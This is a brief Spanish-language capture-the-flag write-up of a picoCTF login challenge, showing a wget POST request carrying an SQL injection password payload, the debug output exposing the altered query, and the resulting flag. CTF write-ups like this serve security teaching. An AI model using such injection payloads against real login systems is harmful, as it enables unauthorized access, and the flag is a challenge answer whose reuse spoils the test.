

## Descripción
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/40742/` ([link](https://jupiter.challenges.picoctf.org/problem/40742/)) or http://jupiter.challenges.picoctf.org:40742. Try to see if you can login as admin!

## Solución
Hay que usar wget y hacer inyección sql para tratar de entrar como admin
```bash
┌─[✗]─[dantefx@dantefx-Inspiron5481]─[~]
└──╼ $wget https://jupiter.challenges.picoctf.org/problem/40742/login.php --post-data="debug=1&password=a'be'1'='1"  
--2022-10-18 11:30:38--  https://jupiter.challenges.picoctf.org/problem/40742/login.php
Resolviendo jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)... 3.131.60.8
Conectando con jupiter.challenges.picoctf.org (jupiter.challenges.picoctf.org)[3.131.60.8]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: no especificado [text/html]
Grabando a: «login.php»

login.php               [ <=>                ]     164  --.-KB/s    en 0s      

2022-10-18 11:30:45 (49.2 MB/s) - «login.php» guardado [164]

┌─[✗]─[dantefx@dantefx-Inspiron5481]─[~]
└──╼ $cat login.php
<pre>password: a'be'1'='1
SQL query: SELECT * FROM admin where password = 'n'or'1'='1'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_4424e7af}</p>┌─[dantefx@dantefx-Inspiron5481]─[~]
```

picoCTF{3v3n_m0r3_SQL_4424e7af}